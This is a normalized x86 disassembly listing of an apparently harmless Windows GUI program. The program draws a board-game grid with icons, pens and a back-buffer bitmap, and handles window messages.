push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa1
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa2
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa3
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa4
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa5
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x98
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x99
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9a
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9b
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9c
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9d
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x9e
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x82
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa6
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_403f70
push ebx
call [ GetDC@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
push 0x154
push 0x132
push esi
mov [ rw-data ] eax
call [ CreateCompatibleBitmap@IAT ]
push eax
push [ rw-data ]
mov [ rw-data ] eax
call [ SelectObject@IAT ]
push 0xa0d2b4
push [ rw-data ]
call sub_404d00
movaps xmm0 [ r--data ]
lea eax [ ebp - 0x14 ]
add esp 0x8
movups [ ebp - 0x14 ] xmm0
push 0x1
push 0xc80000
push eax
call [ AdjustWindowRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x0
call esi
mov ecx [ ebp - 0x14 ]
sub ecx [ ebp - 0xc ]
add eax ecx
cdq
sub eax edx
mov edi eax
push 0x1
sar edi 0x1
call esi
mov ebx [ ebp - 0x10 ]
mov ecx ebx
mov esi [ ebp - 0x8 ]
sub ecx esi
add eax ecx
mov ecx [ ebp - 0xc ]
cdq
add ecx edi
sub eax edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x14 ]
sar eax 0x1
add edx edi
add ebx eax
mov [ ebp - 0x14 ] edx
add esi eax
mov [ ebp - 0x10 ] ebx
push 0x1
mov [ ebp - 0x8 ] esi
sub ecx edx
sub esi ebx
push esi
push ecx
push ebx
push edx
push [ ebp - 0x18 ]
call [ MoveWindow@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub_403d10
push ebp
mov ebp esp
sub esp 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov ecx esi
shl ecx 0x4
add ecx esi
add ecx ecx
sub edi ecx
cmp edi 0x1
jl r-xdata
pop edi
pop esi
cmp edi 0x21
jg r-xdata
mov edi [ ebp + 0x10 ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov eax ecx
shl eax 0x4
add eax ecx
add eax eax
sub edi eax
cmp edi 0x1
jl r-xdata
cmp edi 0x21
jg r-xdata
lea edx [ esi + 0x1 ]
lea eax [ edx - 0x1 ]
lea esi [ ecx + 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x9
ja r-xdata
lea eax [ edx + edx * 2 ]
mov [ ebp + 0xc ] edx
lea eax [ esi + eax * 4 ]
mov [ ebp + 0x10 ] esi
mov ecx [ eax * 4 + rw-data ]
xor eax eax
cmp [ rw-data ] eax
sete al
cmp [ ecx * 4 + r--data ] eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x20
je r-xdata
push ebx
push [ ebp + 0x8 ]
call [ GetDC@IAT ]
mov ecx [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] 0x0
cmp ecx 0x20
je r-xdata
push esi
push edx
push eax
push [ ebp + 0x8 ]
call sub_4037c0
add esp 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov esi [ ecx * 8 + rw-data ]
mov edi [ ecx * 8 + rw-data ]
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
pop ebx
push edi
push esi
push ebx
call sub_4040c0
add esp 0xc
mov eax [ ebp + 0xc ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x10 ]
lea eax [ eax + ecx * 4 ]
mov eax [ eax * 4 + rw-data ]
mov [ rw-data ] eax
push [ eax * 8 + rw-data ]
push [ eax * 8 + rw-data ]
push ebx
call sub_4040c0
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_403e70
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax 0x78787879
imul edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov ecx esi
shl ecx 0x4
add ecx esi
add ecx ecx
sub edi ecx
cmp edi 0x1
jl r-xdata
pop edi
pop esi
pop ebp
retn
cmp edi 0x21
jg r-xdata
mov ecx [ ebp + 0xc ]
mov eax 0x78787879
imul ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
mov eax edi
shl eax 0x4
add eax edi
add eax eax
sub ecx eax
cmp ecx 0x1
jl r-xdata
cmp ecx 0x21
jg r-xdata
lea ecx [ esi + 0x1 ]
lea eax [ ecx - 0x1 ]
lea esi [ edi + 0x1 ]
cmp eax 0x8
ja r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x9
ja r-xdata
mov edx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] esi
cmp edx 0x20
je r-xdata
lea eax [ ecx + ecx * 2 ]
lea eax [ esi + eax * 4 ]
mov ecx [ eax * 4 + rw-data ]
xor eax eax
cmp [ rw-data ] eax
sete al
cmp [ ecx * 4 + r--data ] eax
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ edx * 8 + rw-data ]
push eax
push edx
push rw-data
call sub_4054a0
add esp 0x10
test eax eax
je r-xdata
push [ rw-data ]
call [ SetCursor@IAT ]
pop edi
pop esi
pop ebp
retn
push [ rw-data ]
call [ SetCursor@IAT ]
sub_403f70
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push 0x0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push rw-data
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
push rw-data
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
mov [ rw-data ] 0x0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
movaps xmm0 [ r--data ]
movups [ rw-data ] xmm0
call sub_405be0
add esp 0xc
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x20
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
retn
sub_4040c0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
shl ecx 0x4
add ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp + 0x10 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_404130
mov ecx [ ebp - 0x4 ]
add esp 0x8
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub_404130
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
movaps xmm0 [ r--data ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] ebx
push eax
push eax
movups [ ebp - 0x14 ] xmm0
call [ IntersectRect@IAT ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
push 0xcc0020
push edx
push ecx
push [ rw-data ]
sub eax edx
push eax
mov eax [ ebp - 0xc ]
sub eax ecx
push eax
push edx
push ecx
push ebx
call [ BitBlt@IAT ]
mov eax 0x78787879
imul [ ebp - 0x10 ]
mov eax 0x78787879
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
imul [ ebp - 0xc ]
mov eax 0x78787879
mov [ ebp - 0x30 ] edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
imul [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x24 ] eax
mov eax 0x78787879
imul [ ebp - 0x14 ]
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp esi ecx
jg r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub [ ebp - 0x18 ] esi
lea ebx [ esi + 0x1 ]
mov eax esi
shl eax 0x4
add eax esi
lea ecx [ eax * 2 + 0x1 ]
lea eax [ esi + esi * 2 ]
mov [ ebp - 0x1c ] ecx
mov esi [ ebp - 0x18 ]
lea eax [ edi + eax * 4 ]
lea edx [ eax * 4 + rw-data ]
inc esi
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x18 ] esi
add edx 0x30
add ecx 0x22
inc ebx
mov [ ebp - 0x34 ] edx
sub esi 0x1
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] esi
jne r-xdata
mov eax edi
lea esi [ edi + 0x1 ]
shl eax 0x4
add eax edi
lea edi [ eax * 2 + 0x1 ]
mov eax edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x30 ]
inc edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] edx
nop [ eax ] eax
cmp edi eax
jg r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ eax * 4 + r--data ]
push [ eax * 4 + rw-data ]
push edi
push ecx
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
mov ecx [ ebp - 0x1c ]
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0x20
je r-xdata
cmp [ rw-data ] esi
jne r-xdata
push [ rw-data ]
push edi
push ecx
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
mov eax [ ebp - 0x28 ]
inc esi
mov ecx [ ebp - 0x1c ]
add eax 0x4
add edi 0x22
mov [ ebp - 0x28 ] eax
sub [ ebp - 0x2c ] 0x1
jne r-xdata
cmp [ eax * 8 + rw-data ] ebx
jne r-xdata
mov eax [ eax ]
cmp eax 0x20
je r-xdata
mov edi [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
mov esi [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
cmp [ eax * 8 + rw-data ] esi
jne r-xdata
push [ rw-data ]
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
sub_404320
push ebp
mov ebp esp
sub esp 0x354
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov ecx 0x40
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x33c ] eax
lea edi [ ebp - 0x104 ]
lea eax [ ebp - 0x338 ]
mov [ ebp - 0x354 ] ebx
push eax
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x330 ] 0x20
push eax
lea eax [ ebp - 0x33c ]
mov [ ebp - 0x338 ] 0x0
push eax
mov esi rw-data
mov [ ebp - 0x334 ] 0x0
[ edi ] [ esi ]
lea eax [ ebp - 0x104 ]
mov ecx 0x84
push eax
lea eax [ ebp - 0x314 ]
mov esi rw-data
lea edi [ ebp - 0x314 ]
[ edi ] [ esi ]
push eax
call sub_40a690
add esp 0x14
test eax eax
je r-xdata
mov [ rw-data ] 0x1
mov eax [ ebp - 0x338 ]
mov esi [ ebp - 0x330 ]
mov [ ebp - 0x32c ] eax
mov eax [ ebp - 0x334 ]
push ebx
mov [ ebp - 0x328 ] eax
call [ GetDC@IAT ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x344 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x32c ]
push eax
lea edi [ esi * 8 + rw-data ]
push edi
push esi
push rw-data
mov [ ebp - 0x340 ] edi
call sub_4054a0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x32c ]
mov edx [ ebp - 0x328 ]
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
cmp eax 0x20
je r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ rw-data ]
mov ebx [ rw-data ]
mov [ ebp - 0x34c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x350 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x348 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov edi eax
mov [ rw-data ] eax
mov eax [ ebp - 0x340 ]
push rw-data
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
call sub_405be0
xor eax eax
mov [ rw-data ] 0x20
cmp [ rw-data ] eax
sete al
mov [ rw-data ] eax
mov eax esi
shl eax 0x4
add eax esi
mov esi [ ebp - 0x344 ]
lea edx [ eax * 2 - 0x22 ]
mov eax edi
shl eax 0x4
add eax edi
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_404130
mov ecx [ ebp - 0x32c ]
shl ecx 0x4
add ecx [ ebp - 0x32c ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp - 0x328 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp - 0x328 ]
mov [ ebp - 0x31c ] eax
mov [ ebp - 0x324 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_404130
mov eax ebx
shl eax 0x4
add eax ebx
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x348 ]
shl eax 0x4
add eax [ ebp - 0x348 ]
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_404130
mov eax [ ebp - 0x34c ]
shl eax 0x4
add eax [ ebp - 0x34c ]
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x350 ]
shl eax 0x4
add eax [ ebp - 0x350 ]
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_404130
mov ecx [ rw-data ]
add esp 0x2c
mov eax [ ecx * 4 + r--data ]
cmp [ eax * 8 + rw-data ] 0x0
je r-xdata
mov [ eax * 8 + rw-data ] 0x0
cmp [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push [ rw-data ]
mov esi [ SetCursor@IAT ]
call esi
push [ ebp - 0x354 ]
call sub_404320
add esp 0x4
push [ rw-data ]
call esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub_404690
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0xcc ]
push 0x64
push eax
push 0x6a
push [ rw-data ]
call [ LoadStringW@IAT ]
mov ecx [ ebp + 0xc ]
cmp ecx 0x111
ja r-xdata
mov eax ecx
sub eax 0x200
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
movzx ecx ax
shr eax 0x10
push eax
push ecx
call sub_403e70
sub eax 0x1
je r-xdata
mov ecx [ ebp + 0x10 ]
movzx eax cx
cmp eax 0x8004
jg r-xdata
mov eax ecx
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x14 ]
movzx ecx ax
shr eax 0x10
push eax
push ecx
push edi
call sub_403d10
add esp 0xc
xor eax eax
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push ecx
push edi
call [ DefWindowProcW@IAT ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
cmp eax 0x8005
je r-xdata
je r-xdata
push edi
call sub_403ab0
add esp 0x4
xor eax eax
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
sub eax 0x1
je r-xdata
call sub_403f70
movaps xmm0 [ r--data ]
push edi
mov [ rw-data ] 0x1
movups [ ebp - 0xdc ] xmm0
call [ GetDC@IAT ]
lea ecx [ ebp - 0xdc ]
push ecx
push eax
call sub_404130
jmp r-xdata
push [ ebp + 0x14 ]
push ecx
push 0x111
push edi
call [ DefWindowProcW@IAT ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
call sub_403f70
movaps xmm0 [ r--data ]
push edi
mov [ rw-data ] 0x0
movups [ ebp - 0xdc ] xmm0
call [ GetDC@IAT ]
lea ecx [ ebp - 0xdc ]
push ecx
push eax
call sub_404130
mov esi [ SetCursor@IAT ]
add esp 0x8
push [ rw-data ]
call esi
push edi
call sub_404320
add esp 0x4
push [ rw-data ]
call esi
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
sub eax 0x68
je r-xdata
push [ rw-data ]
call [ DeleteObject@IAT ]
push [ rw-data ]
call [ DeleteDC@IAT ]
push 0x0
call [ PostQuitMessage@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
sub eax 0xd
jne r-xdata
mov ecx [ ebp - 0x4 ]
add esp 0x8
xor ecx ebp
xor eax eax
pop edi
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
push 0x0
push sub_403780
push edi
push 0x67
push [ rw-data ]
call [ DialogBoxParamW@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
sub eax 0x1
jne r-xdata
lea eax [ ebp - 0x12c ]
push eax
push edi
call [ BeginPaint@IAT ]
mov esi eax
lea eax [ ebp - 0xec ]
push eax
push edi
call [ GetClientRect@IAT ]
lea eax [ ebp - 0xec ]
push eax
push esi
call sub_404130
add esp 0x8
lea eax [ ebp - 0x12c ]
push eax
push edi
call [ EndPaint@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
push edi
call [ DestroyWindow@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x10
sub_404940
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ LoadStringW@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push 0x64
push rw-data
push 0x67
push edi
call esi
push 0x64
push rw-data
push 0x6d
push edi
call esi
push edi
call sub_403a30
add esp 0x4
mov [ rw-data ] edi
push 0x0
push edi
push 0x0
push 0x0
push 0x0
push 0x80000000
push 0x0
push 0x80000000
push 0xc80000
push rw-data
push rw-data
push 0x0
call [ CreateWindowExW@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x10
push 0x0
push esi
call [ ShowWindow@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov esi [ GetMessageW@IAT ]
lea eax [ ebp - 0x1c ]
push 0x0
push 0x0
push 0x0
push eax
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov edi [ TranslateMessage@IAT ]
push ebx
mov ebx [ DispatchMessageW@IAT ]
nop [ eax ] eax
lea eax [ ebp - 0x1c ]
push eax
call edi
lea eax [ ebp - 0x1c ]
push eax
call ebx
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call esi
test eax eax
jne r-xdata
pop ebx
sub_404a20
push ebp
mov ebp esp
push 0xffffffff
push sub_41d7af
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ MoveToEx@IAT ]
test eax eax
je r-xdata
cmp eax 0x8
je r-xdata
mov esi eax
shl edi 0x4
add edi [ ebp + 0x10 ]
shl esi 0x4
add edi edi
add esi eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add esi esi
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push ecx
call edx
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ MoveToEx@IAT ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
shl edi 0x4
add edi [ ebp + 0x10 ]
shl esi 0x4
add edi edi
add esi eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add esi esi
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push ecx
call edx
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
push 0x1
call sub_40a861
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx eax
call sub_4036f0
sub_404d00
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0x14
call sub_40e50f
mov ecx 0x14
cdq
idiv ecx
push ecx
movd xmm0 edx
cvtdq2pd xmm0 xmm0
divsd xmm0 [ r--data ]
addsd xmm0 [ r--data ]
cvtpd2ps xmm0 xmm0
movss [ esp ] xmm0
call sub_40e50f
cdq
mov ecx 0x3e8
idiv ecx
add edx 0x1f4
push edx
call sub_40e50f
cdq
mov ecx 0x154
idiv ecx
push edx
call sub_40e50f
neg eax
mov ebx [ ebp + 0xc ]
mov ecx 0x132
cdq
idiv ecx
push edx
push ebx
push 0x154
push ecx
push [ ebp + 0x8 ]
call sub_4051e0
movzx edi bl
mov eax ebx
shr eax 0x8
add esp 0x24
movzx eax al
mov esi 0xff
shr ebx 0x10
mov [ ebp + 0xc ] eax
lea edx [ edi + 0x28 ]
cmp edx esi
movzx ebx bl
lea ecx [ eax + 0x28 ]
cmovg edx esi
cmp ecx esi
cmovg ecx esi
lea eax [ ebx + 0x28 ]
cmp eax esi
cmovg eax esi
movzx esi al
shl esi 0x8
movzx eax cl
xor ecx ecx
or esi eax
movzx eax dl
shl esi 0x8
or esi eax
lea eax [ edi - 0x28 ]
test eax eax
push esi
mov esi [ CreatePen@IAT ]
cmovs eax ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
add eax 0xffffffd8
cmovs eax ecx
mov [ ebp + 0xc ] eax
xor eax eax
add ebx 0xffffffd8
push eax
push eax
cmovs ebx eax
call esi
mov edi eax
mov ecx [ ebp + 0xc ]
movzx ecx cl
movzx edx bl
shl edx 0x8
or edx ecx
mov [ ebp - 0xc ] edi
mov ecx [ ebp - 0x4 ]
shl edx 0x8
movzx ecx cl
or edx ecx
push edx
push 0x0
push 0x0
call esi
mov ebx [ ebp + 0x8 ]
push edi
push ebx
mov [ ebp - 0x8 ] eax
call [ SelectObject@IAT ]
mov edi [ LineTo@IAT ]
xor esi esi
mov [ ebp - 0x4 ] eax
nop
mov eax [ esi * 4 + r--data ]
push 0x0
add eax ecx
push eax
push [ esi * 4 + r--data ]
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax [ ebp + 0xc ]
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
mov ecx [ ebp + 0xc ]
add ecx 0x22
mov [ ebp + 0xc ] ecx
cmp ecx 0x110
jle r-xdata
mov edi 0x22
